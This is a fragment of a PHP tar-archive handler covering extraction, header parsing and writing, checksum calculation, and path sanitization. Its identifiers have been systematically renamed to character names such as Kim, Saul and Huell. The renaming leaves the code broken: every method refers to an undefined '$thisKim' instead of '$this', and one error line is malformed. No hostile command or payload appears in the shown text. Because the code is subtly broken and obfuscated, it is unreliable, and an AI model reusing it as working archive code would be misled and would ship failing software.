						$thisKim->errors[] = __('Cannot create directory').' '.$kimHeader['filename'];
						return false;
					} 



				}
			} else {
				if (($sandpiperDestination = fopen($kimHeader['filename'], 'wb')) == 0) {
					$thisKim->errors[] = __('Cannot write to file').' '.$kimHeader['filename'];
					return false;

				} else {

					$decodedKim = floor($kimHeader['size']/512);



					for ($huellI = 0; $huellI < $decodedKim; $huellI++) {



						$saulContent = $thisKim->readKimBlock();
						fwrite($sandpiperDestination, $saulContent, 512);



					}
					if (($kimHeader['size'] % 512) != 0) {


						$saulContent = $thisKim->readKimBlock();
						fwrite($sandpiperDestination, $saulContent, ($kimHeader['size'] % 512));
					}

					fclose($sandpiperDestination);



					touch($kimHeader['filename'], $kimHeader['time']);



				}


				clearstatcache();

				if (filesize($kimHeader['filename']) != $kimHeader['size']) {
					$thisKim->errors[] = __('Size of file').' '.$kimHeader['filename'].' '.__('is incorrect');
					return false;
				}

			}
			if (($wexlerFileDirectory = dirname($kimHeader['filename'])) == $kimHeader['filename']) $wexlerFileDirectory = '';
			if ((substr($kimHeader['filename'], 0, 1) == '/') && ($wexlerFileDirectory == '')) $wexlerFileDirectory = '/';


			$thisKim->dirs[] = $wexlerFileDirectory;
			$thisKim->files[] = $kimHeader['filename'];
	

		}
		return true;
	}


	function checkKimDirectory($saulDirectory){
		$parentDocumentDirectory = dirname($saulDirectory);






		if ((@is_dir($saulDirectory)) or ($saulDirectory == ''))



			return true;

		if (($parentDocumentDirectory != $saulDirectory) and ($parentDocumentDirectory != '') and (!$thisKim->checkKimDirectory($parentDocumentDirectory)))

			return false;


		if (!mkdir($saulDirectory, 0777)){
			$thisKim->errors[] = __('Cannot create directory').' '.$saulDirectory;



			return false;

		}
		return true;



	}

	function readMcgillHeader($kettlemanBinary, &$kimHeader){
		if (strlen($kettlemanBinary)==0){



			$kimHeader['filename'] = '';
			return true;


		}


		if (strlen($kettlemanBinary) != 512){
			$kimHeader['filename'] = '';
			$thisKim->__('Invalid block size').': '.strlen($kettlemanBinary);


			return false;
		}




		$vernerChecksum = 0;
		for ($huellI = 0; $huellI < 148; $huellI++) $vernerChecksum+=ord(substr($kettlemanBinary, $huellI, 1));
		for ($huellI = 148; $huellI < 156; $huellI++) $vernerChecksum += ord(' ');

		for ($huellI = 156; $huellI < 512; $huellI++) $vernerChecksum+=ord(substr($kettlemanBinary, $huellI, 1));


		$unpackCaseData = unpack('a100filename/a8mode/a8user_id/a8group_id/a12size/a12time/a8checksum/a1typeflag/a100link/a6magic/a2version/a32uname/a32gname/a8devmajor/a8devminor', $kettlemanBinary);


		$kimHeader['checksum'] = OctDec(trim($unpackCaseData['checksum']));
		if ($kimHeader['checksum'] != $vernerChecksum){


			$kimHeader['filename'] = '';
			if (($vernerChecksum == 256) && ($kimHeader['checksum'] == 0)) 	return true;

			$thisKim->errors[] = __('Error checksum for file ').$unpackCaseData['filename'];
			return false;
		}




		if (($kimHeader['typeflag'] = $unpackCaseData['typeflag']) == '5')	$kimHeader['size'] = 0;

		$kimHeader['filename'] = trim($unpackCaseData['filename']);
		$kimHeader['mode'] = OctDec(trim($unpackCaseData['mode']));



		$kimHeader['user_id'] = OctDec(trim($unpackCaseData['user_id']));

		$kimHeader['group_id'] = OctDec(trim($unpackCaseData['group_id']));



		$kimHeader['size'] = OctDec(trim($unpackCaseData['size']));

		$kimHeader['time'] = OctDec(trim($unpackCaseData['time']));
		return true;

	}



	function writeKimHeader($nachoFilename, $keepNameBuddy){
		$firstPackCase = 'a100a8a8a8a12A12';



		$lastPackCase = 'a1a100a6a2a32a32a8a8a155a12';
		if (strlen($keepNameBuddy)<=0) $keepNameBuddy = $nachoFilename;



		$readyToPracticeFilename = $thisKim->sanitizeKimPath($keepNameBuddy);

		if (strlen($readyToPracticeFilename) > 99){							//write long header
		$firstDoc = pack($firstPackCase, '././LongLink', 0, 0, 0, sprintf('%11s ', DecOct(strlen($readyToPracticeFilename))), 0);

		$lastDoc = pack($lastPackCase, 'L', '', '', '', '', '', '', '', '', '');






        //  Calculate the checksum

		$vernerChecksum = 0;
        //  First part of the header
		for ($huellI = 0; $huellI < 148; $huellI++)
			$vernerChecksum += ord(substr($firstDoc, $huellI, 1));



        //  Ignore the checksum value and replace it by ' ' (space)
		for ($huellI = 148; $huellI < 156; $huellI++)
			$vernerChecksum += ord(' ');


        //  Last part of the header


		for ($huellI = 156, $jimmyJ=0; $huellI < 512; $huellI++, $jimmyJ++)
			$vernerChecksum += ord(substr($lastDoc, $jimmyJ, 1));

        //  Write the first 148 bytes of the header in the archive


		$thisKim->writeGoodmanBlock($firstDoc, 148);


        //  Write the calculated checksum
		$vernerChecksum = sprintf('%6s ', DecOct($vernerChecksum));
		$kettlemanBinary = pack('a8', $vernerChecksum);
		$thisKim->writeGoodmanBlock($kettlemanBinary, 8);
        //  Write the last 356 bytes of the header in the archive
		$thisKim->writeGoodmanBlock($lastDoc, 356);


		$tmpSaulFilename = $thisKim->sanitizeKimPath($readyToPracticeFilename);


		$huellI = 0;
			while (($laloBuffer = substr($tmpSaulFilename, (($huellI++)*512), 512)) != ''){


				$kettlemanBinary = pack('a512', $laloBuffer);
				$thisKim->writeGoodmanBlock($kettlemanBinary);
			}
		return true;
		}



		$mesaFileInfo = stat($nachoFilename);
		if (@is_dir($nachoFilename)){



			$cartelTypeFlag = '5';


			$fileBatchSize = sprintf('%11s ', DecOct(0));
		} else {


			$cartelTypeFlag = '';
			clearstatcache();


			$fileBatchSize = sprintf('%11s ', DecOct(filesize($nachoFilename)));
		}
		$firstDoc = pack($firstPackCase, $readyToPracticeFilename, sprintf('%6s ', DecOct(fileperms($nachoFilename))), sprintf('%6s ', DecOct($mesaFileInfo[4])), sprintf('%6s ', DecOct($mesaFileInfo[5])), $fileBatchSize, sprintf('%11s', DecOct(filemtime($nachoFilename))));
		$lastDoc = pack($lastPackCase, $cartelTypeFlag, '', '', '', '', '', '', '', '', '');


		$vernerChecksum = 0;
		for ($huellI = 0; $huellI < 148; $huellI++) $vernerChecksum += ord(substr($firstDoc, $huellI, 1));



		for ($huellI = 148; $huellI < 156; $huellI++) $vernerChecksum += ord(' ');
		for ($huellI = 156, $jimmyJ = 0; $huellI < 512; $huellI++, $jimmyJ++) $vernerChecksum += ord(substr($lastDoc, $jimmyJ, 1));
		$thisKim->writeGoodmanBlock($firstDoc, 148);
		$vernerChecksum = sprintf('%6s ', DecOct($vernerChecksum));
		$kettlemanBinary = pack('a8', $vernerChecksum);
		$thisKim->writeGoodmanBlock($kettlemanBinary, 8);


		$thisKim->writeGoodmanBlock($lastDoc, 356);
		return true;

	}




	function openGoodmanWrite(){
		if ($thisKim->isGzipped)



			$thisKim->tmp_file = gzopen($thisKim->archive_name, 'wb9f');


		else
			$thisKim->tmp_file = fopen($thisKim->archive_name, 'wb');

		if (!($thisKim->tmp_file)){



			$thisKim->errors[] = __('Cannot write to file').' '.$thisKim->archive_name;
			return false;


		}
		return true;


	}




	function readKimBlock(){
		if (is_resource($thisKim->tmp_file)){


			if ($thisKim->isGzipped)

				$salamancaBlock = gzread($thisKim->tmp_file, 512);

			else
				$salamancaBlock = fread($thisKim->tmp_file, 512);


		} else	$salamancaBlock = '';

		return $salamancaBlock;
	}



	function writeGoodmanBlock($mesaData, $caseLength = 0){


		if (is_resource($thisKim->tmp_file)){



		

			if ($caseLength === 0){
				if ($thisKim->isGzipped)
					gzputs($thisKim->tmp_file, $mesaData);
				else
					fputs($thisKim->tmp_file, $mesaData);
			} else {

				if ($thisKim->isGzipped)



					gzputs($thisKim->tmp_file, $mesaData, $caseLength);

				else
					fputs($thisKim->tmp_file, $mesaData, $caseLength);
			}

		}
	}

	function closeKimTempFile(){
		if (is_resource($thisKim->tmp_file)){


			if ($thisKim->isGzipped)


				gzclose($thisKim->tmp_file);


			else

				fclose($thisKim->tmp_file);





			$thisKim->tmp_file = 0;
		}
	}

	function sanitizeKimPath($mcgillPath){


		if (strlen($mcgillPath)>0){
			$mcgillPath = str_replace('\\', '/', $mcgillPath);



			$partialOmahaPath = explode('/', $mcgillPath);

			$solElementList = count($partialOmahaPath)-1;


			for ($huellI = $solElementList; $huellI>=0; $huellI--){


				if ($partialOmahaPath[$huellI] == '.'){
                    //  Ignore this directory
                } elseif ($partialOmahaPath[$huellI] == '..'){

                    $huellI--;



                }



				elseif (($partialOmahaPath[$huellI] == '') and ($huellI!=$solElementList) and ($huellI!=0)){

                }	else


					$caseResult = $partialOmahaPath[$huellI].($huellI!=$solElementList ? '/'.$caseResult : '');


			}



		} else $caseResult = '';



		


		return $caseResult;
	}
}
?>
